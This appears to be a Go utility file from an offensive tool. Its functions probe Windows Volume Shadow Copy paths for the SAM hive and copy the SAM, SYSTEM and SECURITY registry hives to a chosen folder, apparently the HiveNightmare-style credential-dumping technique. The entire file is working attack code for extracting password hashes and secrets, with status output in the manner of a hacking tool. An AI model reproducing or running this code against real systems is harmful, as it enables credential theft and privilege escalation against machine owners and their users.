package utils

import (
	"fmt"
	"io"
	"os"
	"path"
)

func ScanForHiveShadow(whichDriveNumber int) int {
	if _, err := os.Stat(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SAM", whichDriveNumber)); err == nil {
		return whichDriveNumber
	}
	return 0
}

func CopyHiveData(outputPath string, driveNumber int) bool {
	sByte, err := copy(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SAM", driveNumber), path.Join(outputPath, "SAM"))
	if err != nil {
		fmt.Println("[-] FAILED to copy SAM file")
		fmt.Print(err)
	} else {
		fmt.Println(fmt.Sprintf("[+] Copyed %d bytes from SAM into %s", sByte, path.Join(outputPath, "SAM")))
		ssByte, serr := copy(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SYSTEM", driveNumber), path.Join(outputPath, "SYSTEM"))
		if serr != nil {
			fmt.Println("[-] FAILED to copy SYSTEM file")
		} else {
			fmt.Println(fmt.Sprintf("[+] Copyed %d bytes from SYSTEM into %s", ssByte, path.Join(outputPath, "SYSTEM")))
			sssByte, sserr := copy(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SECURITY", driveNumber), path.Join(outputPath, "SECURITY"))
			if sserr != nil {
				fmt.Println("[-] FAILED to copy SECURITY file")
			} else {
				fmt.Println(fmt.Sprintf("[+] Copyed %d bytes from SECURITY into %s", sssByte, path.Join(outputPath, "SECURITY")))
				return true
			}
		}
	}
	return false
}

func copy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}
